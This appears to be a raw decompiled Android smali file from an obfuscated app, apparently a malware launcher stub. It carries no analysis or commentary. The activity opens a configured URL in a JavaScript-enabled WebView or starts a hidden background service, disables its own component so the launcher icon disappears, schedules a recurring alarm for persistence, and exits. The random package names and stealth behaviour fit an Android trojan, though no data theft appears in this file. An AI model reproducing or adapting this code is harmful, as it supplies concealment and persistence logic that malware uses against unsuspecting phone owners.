.class public Lwocwvy/czyxoxmbauu/slsa/ncec/myvbo;
.super Landroid/app/Activity;


# instance fields
.field a:Lwocwvy/czyxoxmbauu/slsa/b;

.field b:Lwocwvy/czyxoxmbauu/slsa/c;

.field c:Lwocwvy/czyxoxmbauu/slsa/b;

.field d:Lwocwvy/czyxoxmbauu/slsa/a;


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/b;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/myvbo;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/c;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/c;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/myvbo;->b:Lwocwvy/czyxoxmbauu/slsa/c;

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/b;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/myvbo;->c:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/a;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/a;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/myvbo;->d:Lwocwvy/czyxoxmbauu/slsa/a;

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/myvbo;->b:Lwocwvy/czyxoxmbauu/slsa/c;

    iget-boolean p1, p1, Lwocwvy/czyxoxmbauu/slsa/c;->o:Z

    const/4 v0, 0x1

    if-eqz p1, :cond_0

    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x13

    if-lt p1, v1, :cond_0

    new-instance p1, Landroid/webkit/WebView;

    invoke-direct {p1, p0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v0}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/myvbo;->b:Lwocwvy/czyxoxmbauu/slsa/c;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/c;->p:Ljava/lang/String;

    invoke-virtual {p1, v1}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    invoke-virtual {p0, p1}, Lwocwvy/czyxoxmbauu/slsa/ncec/myvbo;->setContentView(Landroid/view/View;)V

    goto :goto_0

    :cond_0
    new-instance p1, Landroid/content/Intent;

    const-class v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;

    invoke-direct {p1, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, p1}, Lwocwvy/czyxoxmbauu/slsa/ncec/myvbo;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :goto_0
    new-instance p1, Landroid/content/ComponentName;

    const-class v1, Lwocwvy/czyxoxmbauu/slsa/ncec/myvbo;

    invoke-direct {p1, p0, v1}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0}, Lwocwvy/czyxoxmbauu/slsa/ncec/myvbo;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    const/4 v2, 0x2

    invoke-virtual {v1, p1, v2, v0}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    :try_start_0
    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/myvbo;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string p1, "startAlarm"

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/myvbo;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v1, "Interval"

    invoke-virtual {v0, p0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    int-to-long v0, v0

    invoke-static {p0, p1, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;Ljava/lang/String;J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/myvbo;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string p1, "startAlarm"

    const-wide/16 v0, 0x2710

    invoke-static {p0, p1, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;Ljava/lang/String;J)V

    :goto_1
    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/myvbo;->b:Lwocwvy/czyxoxmbauu/slsa/c;

    iget-boolean p1, p1, Lwocwvy/czyxoxmbauu/slsa/c;->o:Z

    if-nez p1, :cond_1

    invoke-virtual {p0}, Lwocwvy/czyxoxmbauu/slsa/ncec/myvbo;->finish()V

    :cond_1
    return-void
.end method
